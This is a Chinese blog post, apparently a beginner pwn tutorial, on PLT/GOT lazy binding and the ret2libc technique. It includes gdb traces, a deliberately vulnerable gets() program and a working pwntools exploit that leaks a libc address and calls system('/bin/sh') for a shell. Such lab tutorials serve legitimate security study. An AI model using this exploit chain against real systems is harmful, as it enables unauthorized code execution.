@@ -1,0 +1,819 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn,gdb,ropgadget,ret2libc,动态链接,延迟绑定机制,PLT&GOT,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="PLT表和GOT表及延迟绑定机制linux下的动态链接是通过PLT&amp;amp;GOT来实现的 关于动态链接与静态链接，可以打个比方就是：如果我的文章引用了别人的一部分文字，在我发布文章的时候把别人的段落复制到我的文章里面就属于静态连接，而做一个超链接让你们自己去看就属于动态链接了">
+<meta name="keywords" content="pwn,gdb,ropgadget,ret2libc,动态链接,延迟绑定机制,PLT&amp;GOT">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2libc">
+<meta property="og:url" content="http://yoursite.com/2020/04/08/ret2libc/index.html">
+<meta property="og:site_name" content="pukr&#39;s BLOG">
+<meta property="og:description" content="PLT表和GOT表及延迟绑定机制linux下的动态链接是通过PLT&amp;amp;GOT来实现的 关于动态链接与静态链接，可以打个比方就是：如果我的文章引用了别人的一部分文字，在我发布文章的时候把别人的段落复制到我的文章里面就属于静态连接，而做一个超链接让你们自己去看就属于动态链接了">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/ret2libc/objdump1.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/ret2libc/plt1.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/ret2libc/plt3.jpeg">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/ret2libc/plt2.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/ret2libc/plt4.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/ret2libc/plt5.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/ret2libc/plt6.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/ret2libc/plt7.jpeg">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/ret2libc/plt8.jpeg">
+<meta property="og:image" content="http://yoursite.com/2020/04/08/ret2libc/system.png">
+<meta property="og:updated_time" content="2020-04-08T09:53:44.528Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ret2libc">
+<meta name="twitter:description" content="PLT表和GOT表及延迟绑定机制linux下的动态链接是通过PLT&amp;amp;GOT来实现的 关于动态链接与静态链接，可以打个比方就是：如果我的文章引用了别人的一部分文字，在我发布文章的时候把别人的段落复制到我的文章里面就属于静态连接，而做一个超链接让你们自己去看就属于动态链接了">
+<meta name="twitter:image" content="http://yoursite.com/2020/04/08/ret2libc/objdump1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/04/08/ret2libc/">
+
+
+
+
+
+  <title>ret2libc | pukr's BLOG</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">pukr's BLOG</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">人类的悲欢并不相通</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/08/ret2libc/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="尘林">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/zql.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="pukr's BLOG">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ret2libc</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-08T15:07:29+08:00">
+                2020-04-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN入门/" itemprop="url" rel="index">
+                    <span itemprop="name">PWN入门</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="PLT表和GOT表及延迟绑定机制"><a href="#PLT表和GOT表及延迟绑定机制" class="headerlink" title="PLT表和GOT表及延迟绑定机制"></a>PLT表和GOT表及延迟绑定机制</h1><p>linux下的动态链接是通过PLT&amp;GOT来实现的</p>
+<blockquote><p>关于动态链接与静态链接，可以打个比方就是：如果我的文章引用了别人的一部分文字，在我发布文章的时候把别人的段落复制到我的文章里面就属于静态连接，而做一个超链接让你们自己去看就属于动态链接了</p>
+</blockquote>
+<a id="more"></a>
+<p>C语言代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;hello world\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>编译：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -o test.exe test.c</span><br></pre></td></tr></table></figure></p>
+<p>查看plt表：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d -j .plt test.exe</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2020/04/08/ret2libc/objdump1.png" alt></p>
+<p>可以看到，所有plt表里的函数地址都是负数，也就是说，printf函数位于glibc动态库内，所以在编译和链接阶段，链接器无法知知道进程运行起来之后printf函数的加载地址。只有进程运运行后，printf函数的地址才能确定。                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               </p>
+<p>进程运行起来之后，glibc动态库也装载了，printf函数地址亦已确定，上述call指令如何修改（重定位）呢？</p>
+<p>一个简单的方法就是将指令中的<code>printf函数地址</code>修改printf函数的真正地址即可。</p>
+<p>但这个方案面临两个问题：<br><blockquote><p>现代操作系统不允许修改代码段，只能修改数据段<br>如果print_banner函数是在一个动态库（.so对象）内，修改了代码段，那么它就无法做到系统内所有进程共享同一个动态库。</p>
+</blockquote></p>
+<p>因此，printf函数地址只能回写到数据段内，而不能回写到代码段上。</p>
+<p>链接器会额外生成一小段代码，通过这段代码来获取 printf() 的地址，像下面这样，进行链接的时候只需要对printf_stub() 进行重定位操作就可以</p>
+<p><img src="/2020/04/08/ret2libc/plt1.png" alt></p>
+<p>简化为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">// 调用printf的call指令</span><br><span class="line">call printf_stub</span><br><span class="line">...</span><br><span class="line">printf_stub:</span><br><span class="line">    mov rax, [printf函数的储存地址] // 获取printf重定位之后的地址</span><br><span class="line">    jmp rax // 跳过去执行printf函数</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">...</span><br><span class="line">printf函数的储存地址,这里储存printf函数重定位后的地址</span><br></pre></td></tr></table></figure></p>
+<p>总体来说，动态链接每个函数需要两个东西：<br>1、用来存放外部函数地址的数据段<br>2、用来获取数据段记录的外部函数地址的代码</p>
+<p>为什么设置成这么奇怪的结构，后面会说明。</p>
+<p>对应有两个表，一个用来存放外部的函数地址的数据表称为全局偏移表（GOT, Global Offset Table），那个存放额外代码的表称为程序链接表（PLT，Procedure Link Table）<br><img src="/2020/04/08/ret2libc/plt3.jpeg" alt></p>
+<p>可执行文件里面保存的是 PLT 表的地址，对应 PLT 地址指向的是 GOT 的地址，GOT 表指向的就是 glibc 中的地址</p>
+<p>在这里面想要通过 plt 表获取函数的地址，首先要保证 got 表已经获取了正确的地址，但是在一开始就进行所有函数的重定位是比较麻烦的，为此，linux 引入了延迟绑定机制</p>
+<h1 id="延迟绑定机制"><a href="#延迟绑定机制" class="headerlink" title="延迟绑定机制"></a>延迟绑定机制</h1><p>只有动态库函数在被调用时，才会地址解析和重定位工作，为此可以使用类似这样的代码来实现：</p>
+<p>跳转到<code>&lt;printf@plt&gt;</code>看看发生了什么<br><img src="/2020/04/08/ret2libc/plt2.png" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0x56556030 &lt;puts@plt&gt;                  jmp    dword ptr [ebx + 0xc] &lt;0x5655900c&gt;</span><br><span class="line"> </span><br><span class="line">0x56556036 &lt;puts@plt+6&gt;                push   0</span><br><span class="line">0x5655603b &lt;puts@plt+11&gt;               jmp    0x56556020</span><br><span class="line"> ↓</span><br><span class="line">0x56556020                             push   dword ptr [ebx + 4]</span><br><span class="line">0x56556026                             jmp    dword ptr [ebx + 8]</span><br><span class="line"> ↓</span><br><span class="line">0xf7fe9440 &lt;_dl_runtime_resolve&gt;       push   eax</span><br><span class="line">0xf7fe9441 &lt;_dl_runtime_resolve+1&gt;     push   ecx</span><br><span class="line">0xf7fe9442 &lt;_dl_runtime_resolve+2&gt;     push   edx</span><br><span class="line">0xf7fe9443 &lt;_dl_runtime_resolve+3&gt;     mov    edx, dword ptr [esp + 0x10]</span><br><span class="line">0xf7fe9447 &lt;_dl_runtime_resolve+7&gt;     mov    eax, dword ptr [esp + 0xc]</span><br><span class="line">0xf7fe944b &lt;_dl_runtime_resolve+11&gt;    call   _dl_fixup &lt;0xf7fe37f0&gt;</span><br></pre></td></tr></table></figure></p>
+<p>简化为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//一开始没有重定位的时候将 printf@got 填成 lookup_printf 的地址</span><br><span class="line">void printf@plt()</span><br><span class="line">&#123;</span><br><span class="line">address_good:</span><br><span class="line">    jmp *printf@got   </span><br><span class="line">lookup_printf:</span><br><span class="line">    调用重定位函数查找 printf 地址，并写到 printf@got</span><br><span class="line">	goto address_good;//再返回去执行address_good</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>看看栈中出现的其他地址分别是什么：<br><img src="/2020/04/08/ret2libc/plt4.png" alt></p>
+<p>继续n，看到这样的指令：<br><img src="/2020/04/08/ret2libc/plt5.png" alt><br>进入到了<code>&lt;_dl_runtime_resolve&gt;</code>函数。</p>
+<p>再继续执行，发现了<code>call_dl_fixup &lt;0xf7fe37f0&gt;</code>指令。这是真正的寻址。</p>
+<p>执行完这个函数后，再回来看GOT表中储存printf函数真实地址的内存单元：<br><img src="/2020/04/08/ret2libc/plt6.png" alt><br>可见，这时候存储的就是glibc中真实的printf（puts）函数的地址了。</p>
+<p>这里还有很多细节问题，我暂时没有清楚。但是大致流程是这样的。</p>
+<p>第一次调用：<br><img src="/2020/04/08/ret2libc/plt7.jpeg" alt></p>
+<p>再一次调用：<br><img src="/2020/04/08/ret2libc/plt8.jpeg" alt></p>
+<h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><p>C语言代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">char buf2[10] = &quot;this is buf2&quot;;</span><br><span class="line">void vul()</span><br><span class="line">&#123;</span><br><span class="line">	char buf1[10];</span><br><span class="line">	gets(buf1);</span><br><span class="line">&#125;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">	write(1,&quot;sinxx&quot;,5);</span><br><span class="line">	vul();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2020/04/08/ret2libc/system.png" alt></p>
+<p>可以看到，编译出来的文件中不包含system函数和’/bin/sh’字符串。但是glibc的地址是泄露了的，所以通过泄露的地址再减去偏移可计算出基址。</p>
+<p>基址加上需要的偏移就会得到任意函数或者字符串。</p>
+<p>第一次输入获得泄露的真实地址并接收，返回地址用可在此执行rop链的函数覆盖。第二次输入发送payload并getshell。</p>
+<p>通常用elf来寻找真实地址，而不是手动寻找。</p>
+<p>偏移：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&quot;i386&quot;,os=&quot;linux&quot;)</span><br><span class="line">p=process(&quot;t.exe&quot;)</span><br><span class="line">e=ELF(&quot;t.exe&quot;)</span><br><span class="line">lib=ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</span><br><span class="line">va_sh=lib.search(&quot;/bin/sh&quot;).next()</span><br><span class="line">va_system=lib.symbols[&quot;system&quot;]</span><br><span class="line">va_gets=lib.symbols[&quot;gets&quot;]</span><br><span class="line">print hex(va_sh)+&quot;  &quot;+hex(va_system)+&quot;  &quot;+hex(va_gets)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addr_gets=e.plt[&quot;gets&quot;]</span><br><span class="line">addr_gets2=e.got[&quot;gets&quot;]</span><br><span class="line">print hex(addr_gets)</span><br><span class="line">print hex(addr_gets2)</span><br><span class="line"></span><br><span class="line">addr_strcpy=e.plt[&quot;strcpy&quot;]</span><br><span class="line">addr_strcpy2=e.got[&quot;strcpy&quot;]</span><br><span class="line">print hex(addr_strcpy)</span><br><span class="line">print hex(addr_strcpy2)</span><br><span class="line"></span><br><span class="line">addr_puts=e.plt[&quot;puts&quot;]</span><br><span class="line">addr_puts2=e.got[&quot;puts&quot;]</span><br><span class="line">print hex(addr_puts)</span><br><span class="line">print hex(addr_puts2)</span><br><span class="line"></span><br><span class="line">addr_read=e.plt[&quot;read&quot;]</span><br><span class="line">addr_read2=e.got[&quot;read&quot;]</span><br><span class="line">print hex(addr_read)</span><br><span class="line">print hex(addr_read2)</span><br><span class="line"></span><br><span class="line">addr_write=e.plt[&quot;write&quot;]</span><br><span class="line">addr_write2=e.got[&quot;write&quot;]</span><br><span class="line">print hex(addr_write)</span><br><span class="line">print hex(addr_write2)</span><br><span class="line"></span><br><span class="line">addr_scanf=e.plt[&quot;__isoc99_scanf&quot;]</span><br><span class="line">addr_scanf2=e.got[&quot;__isoc99_scanf&quot;]</span><br><span class="line">print hex(addr_scanf)</span><br><span class="line">print hex(addr_scanf2)</span><br><span class="line"></span><br><span class="line">addr_start=e.plt[&quot;__libc_start_main&quot;]</span><br><span class="line">addr_start2=e.got[&quot;__libc_start_main&quot;]</span><br><span class="line">print hex(addr_start)</span><br><span class="line">print hex(addr_start2)</span><br><span class="line">p.sendline(&quot;ddddddddddd&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&quot;i386&quot;,os=&quot;linux&quot;)</span><br><span class="line">p=process(&quot;./9.exe&quot;)</span><br><span class="line">e=ELF(&quot;.9.exe&quot;)</span><br><span class="line">addr_write=e.plt[&quot;write&quot;]</span><br><span class="line">addr_gets=e.got[&quot;gets&quot;]</span><br><span class="line">addr_vul=e.symbols[&quot;vul&quot;]</span><br><span class="line"></span><br><span class="line">print pidof(p)</span><br><span class="line">offset=22</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload1=offset*&apos;a&apos;+p32(addr_write)+p32(addr_vul)+p32(1)+p32(addr_gets)+p32(4)</span><br><span class="line">#填充&apos;a&apos;，然后跳转到write函数地址。write函数的返回地址用vul函数覆盖，write函数的参数为&quot;1, gets函数地址, 4&quot;</span><br><span class="line">p.sendlineafter(&quot;sinxx&quot;,payload1)</span><br><span class="line">gets_real_addr=u32(p.recv(4))</span><br><span class="line"></span><br><span class="line">libc=ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</span><br><span class="line">rva_libc=gets_real_addr-libc.symbols[&quot;gets&quot;]</span><br><span class="line">addr_system=rva_libc+libc.symbols[&quot;system&quot;]</span><br><span class="line">addr_binsh=rva_libc+libc.search(&quot;/bin/sh&quot;).next()</span><br><span class="line"></span><br><span class="line">payload2=offset*&apos;a&apos;+p32(addr_system)+p32(0)+p32(addr_binsh)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+            <a href="/tags/gdb/" rel="tag"># gdb</a>
+          
+            <a href="/tags/ropgadget/" rel="tag"># ropgadget</a>
+          
+            <a href="/tags/ret2libc/" rel="tag"># ret2libc</a>
+          
+            <a href="/tags/动态链接/" rel="tag"># 动态链接</a>
+          
+            <a href="/tags/延迟绑定机制/" rel="tag"># 延迟绑定机制</a>
+          
+            <a href="/tags/PLT-GOT/" rel="tag"># PLT&GOT</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/04/01/rsa加密原理（数论相关）/" rel="next" title="rsa加密原理（数论相关）">
+                <i class="fa fa-chevron-left"></i> rsa加密原理（数论相关）
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/04/09/密码学笔记（一）/" rel="prev" title="密码学笔记（一）">
+                密码学笔记（一） <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/zql.jpg" alt="尘林">
+            
+              <p class="site-author-name" itemprop="name">尘林</p>
+              <p class="site-description motion-element" itemprop="description">势，只会裹挟随波逐流之人。一心既定，便不问大势所趋。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">52</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">66</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PLT表和GOT表及延迟绑定机制"><span class="nav-number">1.</span> <span class="nav-text">PLT表和GOT表及延迟绑定机制</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#延迟绑定机制"><span class="nav-number">2.</span> <span class="nav-text">延迟绑定机制</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2libc"><span class="nav-number">3.</span> <span class="nav-text">ret2libc</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">尘林</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
